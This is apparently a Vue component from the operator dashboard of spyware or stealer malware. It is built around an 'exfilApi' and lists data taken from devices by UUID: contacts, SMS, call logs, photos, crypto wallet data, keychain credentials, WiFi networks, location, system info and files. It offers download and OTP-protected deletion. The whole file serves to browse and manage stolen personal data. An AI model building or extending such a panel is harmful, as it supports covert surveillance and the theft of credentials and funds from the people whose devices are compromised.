<template>
  <div class="page-container">
    <el-card shadow="never">
      <el-tabs v-model="activeTab" @tab-change="onTabChange">
        <!-- Contacts -->
        <el-tab-pane label="联系人" name="contacts">
          <el-table :data="tableData" v-loading="loading" border stripe size="small">
            <el-table-column label="设备UUID" prop="device_uuid" min-width="180" show-overflow-tooltip />
            <el-table-column label="姓名" prop="name" min-width="120" />
            <el-table-column label="电话" prop="phone" min-width="120" />
            <el-table-column label="邮箱" prop="email" min-width="150" />
            <el-table-column label="创建时间" prop="created_at" width="180" />
            <el-table-column label="操作" width="80">
              <template #default="{ row }">
                <el-button text size="small" type="danger" @click="deleteExfil(row)">删除</el-button>
              </template>
            </el-table-column>
          </el-table>
        </el-tab-pane>

        <!-- SMS -->
        <el-tab-pane label="短信" name="sms">
          <el-table :data="tableData" v-loading="loading" border stripe size="small">
            <el-table-column label="设备UUID" prop="device_uuid" min-width="180" show-overflow-tooltip />
            <el-table-column label="类型" prop="type" width="80" />
            <el-table-column label="地址" prop="address" min-width="120" />
            <el-table-column label="内容" prop="body" min-width="300" show-overflow-tooltip />
            <el-table-column label="时间" prop="date" width="180" />
            <el-table-column label="创建时间" prop="created_at" width="180" />
            <el-table-column label="操作" width="80">
              <template #default="{ row }">
                <el-button text size="small" type="danger" @click="deleteExfil(row)">删除</el-button>
              </template>
            </el-table-column>
          </el-table>
        </el-tab-pane>

        <!-- Calls -->
        <el-tab-pane label="通话记录" name="calls">
          <el-table :data="tableData" v-loading="loading" border stripe size="small">
            <el-table-column label="设备UUID" prop="device_uuid" min-width="180" show-overflow-tooltip />
            <el-table-column label="类型" prop="type" width="80" />
            <el-table-column label="号码" prop="number" min-width="120" />
            <el-table-column label="时长" prop="duration" width="80" />
            <el-table-column label="时间" prop="date" width="180" />
            <el-table-column label="创建时间" prop="created_at" width="180" />
            <el-table-column label="操作" width="80">
              <template #default="{ row }">
                <el-button text size="small" type="danger" @click="deleteExfil(row)">删除</el-button>
              </template>
            </el-table-column>
          </el-table>
        </el-tab-pane>

        <!-- Photos -->
        <el-tab-pane label="照片" name="photos">
          <el-table :data="tableData" v-loading="loading" border stripe size="small">
            <el-table-column label="设备UUID" prop="device_uuid" min-width="180" show-overflow-tooltip />
            <el-table-column label="文件名" prop="filename" min-width="150" />
            <el-table-column label="大小" prop="size" width="100" />
            <el-table-column label="URL" prop="url" min-width="200" show-overflow-tooltip />
            <el-table-column label="创建时间" prop="created_at" width="180" />
            <el-table-column label="操作" width="120">
              <template #default="{ row }">
                <el-button text size="small" @click="downloadExfil(row)">下载</el-button>
                <el-button text size="small" type="danger" @click="deleteExfil(row)">删除</el-button>
              </template>
            </el-table-column>
          </el-table>
        </el-tab-pane>

        <!-- Wallets -->
        <el-tab-pane label="钱包" name="wallets">
          <el-table :data="tableData" v-loading="loading" border stripe size="small">
            <el-table-column label="设备UUID" prop="device_uuid" min-width="180" show-overflow-tooltip />
            <el-table-column label="类型" prop="wallet_type" width="120" />
            <el-table-column label="数据" prop="data" min-width="300" show-overflow-tooltip />
            <el-table-column label="创建时间" prop="created_at" width="180" />
            <el-table-column label="操作" width="80">
              <template #default="{ row }">
                <el-button text size="small" type="danger" @click="deleteExfil(row)">删除</el-button>
              </template>
            </el-table-column>
          </el-table>
        </el-tab-pane>

        <!-- Keychain -->
        <el-tab-pane label="钥匙串" name="keychain">
          <el-table :data="tableData" v-loading="loading" border stripe size="small">
            <el-table-column label="设备UUID" prop="device_uuid" min-width="180" show-overflow-tooltip />
            <el-table-column label="分类" prop="category" width="100" />
            <el-table-column label="服务" prop="service" min-width="120" />
            <el-table-column label="账号" prop="account" min-width="150" />
            <el-table-column label="数据" prop="data" min-width="200" show-overflow-tooltip />
            <el-table-column label="创建时间" prop="created_at" width="180" />
            <el-table-column label="操作" width="80">
              <template #default="{ row }">
                <el-button text size="small" type="danger" @click="deleteExfil(row)">删除</el-button>
              </template>
            </el-table-column>
          </el-table>
        </el-tab-pane>

        <!-- WiFi -->
        <el-tab-pane label="WiFi" name="wifi">
          <el-table :data="tableData" v-loading="loading" border stripe size="small">
            <el-table-column label="设备UUID" prop="device_uuid" min-width="180" show-overflow-tooltip />
            <el-table-column label="SSID" prop="ssid" min-width="150" />
            <el-table-column label="BSSID" prop="bssid" min-width="150" />
            <el-table-column label="加密" prop="encryption" width="100" />
            <el-table-column label="信号" prop="signal" width="80" />
            <el-table-column label="创建时间" prop="created_at" width="180" />
            <el-table-column label="操作" width="80">
              <template #default="{ row }">
                <el-button text size="small" type="danger" @click="deleteExfil(row)">删除</el-button>
              </template>
            </el-table-column>
          </el-table>
        </el-tab-pane>

        <!-- Location -->
        <el-tab-pane label="位置" name="location">
          <el-table :data="tableData" v-loading="loading" border stripe size="small">
            <el-table-column label="设备UUID" prop="device_uuid" min-width="180" show-overflow-tooltip />
            <el-table-column label="纬度" prop="latitude" width="100" />
            <el-table-column label="经度" prop="longitude" width="100" />
            <el-table-column label="精度" prop="accuracy" width="100" />
            <el-table-column label="海拔" prop="altitude" width="100" />
            <el-table-column label="时间" prop="timestamp" width="180" />
            <el-table-column label="创建时间" prop="created_at" width="180" />
            <el-table-column label="操作" width="80">
              <template #default="{ row }">
                <el-button text size="small" type="danger" @click="deleteExfil(row)">删除</el-button>
              </template>
            </el-table-column>
          </el-table>
        </el-tab-pane>

        <!-- System Info -->
        <el-tab-pane label="系统信息" name="system_info">
          <el-table :data="tableData" v-loading="loading" border stripe size="small">
            <el-table-column label="设备UUID" prop="device_uuid" min-width="180" show-overflow-tooltip />
            <el-table-column label="信息" prop="data" min-width="400" show-overflow-tooltip />
            <el-table-column label="创建时间" prop="created_at" width="180" />
            <el-table-column label="操作" width="80">
              <template #default="{ row }">
                <el-button text size="small" type="danger" @click="deleteExfil(row)">删除</el-button>
              </template>
            </el-table-column>
          </el-table>
        </el-tab-pane>

        <!-- Files -->
        <el-tab-pane label="文件" name="files">
          <el-table :data="tableData" v-loading="loading" border stripe size="small">
            <el-table-column label="设备UUID" prop="device_uuid" min-width="180" show-overflow-tooltip />
            <el-table-column label="文件名" prop="filename" min-width="150" />
            <el-table-column label="大小" prop="size" width="100" />
            <el-table-column label="路径" prop="path" min-width="200" show-overflow-tooltip />
            <el-table-column label="创建时间" prop="created_at" width="180" />
            <el-table-column label="操作" width="120">
              <template #default="{ row }">
                <el-button text size="small" @click="downloadExfil(row)">下载</el-button>
                <el-button text size="small" type="danger" @click="deleteExfil(row)">删除</el-button>
              </template>
            </el-table-column>
          </el-table>
        </el-tab-pane>
      </el-tabs>

      <!-- Common filters and pagination -->
      <div style="display: flex; justify-content: space-between; margin-top: 16px">
        <div style="display: flex; gap: 10px; align-items: center">
          <el-input v-model="filters.search" placeholder="搜索" clearable style="width: 200px" @keyup.enter="loadData" />
          <el-input v-model="filters.device_uuid" placeholder="设备UUID" clearable style="width: 200px" @keyup.enter="loadData" />
          <el-button type="primary" @click="loadData">查询</el-button>
        </div>
        <el-pagination
          v-model:current-page="pagination.page"
          v-model:page-size="pagination.pageSize"
          :total="pagination.total"
          :page-sizes="[20, 50, 100]"
          layout="total, sizes, prev, pager, next"
          @size-change="loadData"
          @current-change="loadData"
        />
      </div>
    </el-card>
  </div>
</template>

<script setup lang="ts">
import { ref, reactive, onMounted, inject } from 'vue'
import { exfilApi } from '@/api/modules'
import { ElMessage, ElMessageBox } from 'element-plus'

const withOtpRetry = inject('withOtpRetry') as <T>(fn: (otp?: string) => Promise<T>) => Promise<T>

const loading = ref(false)
const tableData = ref<any[]>([])
const activeTab = ref('contacts')
const filters = reactive({ search: '', device_uuid: '' })
const pagination = reactive({ page: 1, pageSize: 20, total: 0 })

const tabApiMap: Record<string, (params: Record<string, any>) => Promise<any>> = {
  contacts: exfilApi.contacts,
  sms: exfilApi.sms,
  calls: exfilApi.calls,
  photos: exfilApi.photos,
  wallets: exfilApi.wallets,
  keychain: exfilApi.keychain,
  wifi: exfilApi.wifi,
  location: exfilApi.location,
  system_info: exfilApi.systemInfo,
  files: exfilApi.files,
}

async function loadData() {
  loading.value = true
  try {
    const params: Record<string, any> = {
      skip: (pagination.page - 1) * pagination.pageSize,
      limit: pagination.pageSize,
      search: filters.search || undefined,
      device_uuid: filters.device_uuid || undefined,
    }
    Object.keys(params).forEach((k) => { if (!params[k]) delete params[k] })
    const apiFn = tabApiMap[activeTab.value]
    if (!apiFn) return
    const res: any = await apiFn(params)
    tableData.value = res?.items || res || []
    pagination.total = res?.total ?? tableData.value.length
  } catch {
    // handled
  } finally {
    loading.value = false
  }
}

function onTabChange() {
  pagination.page = 1
  loadData()
}

async function deleteExfil(row: any) {
  try {
    await ElMessageBox.confirm('确定要删除此数据吗？', '确认', { type: 'warning' })
    await withOtpRetry((otp) => exfilApi.delete(row.id, otp))
    ElMessage.success('删除成功')
    loadData()
  } catch {
    // cancelled
  }
}

async function downloadExfil(row: any) {
  try {
    const res: any = await exfilApi.download(row.id)
    const blob = res instanceof Blob ? res : new Blob([res])
    const url = window.URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = row.filename || `exfil_${row.id}`
    a.click()
    window.URL.revokeObjectURL(url)
  } catch {
    // handled
  }
}

onMounted(() => {
  loadData()
})
</script>

<style scoped>
.table-toolbar {
  display: flex;
  justify-content: space-between;
  margin-bottom: 12px;
}
</style>
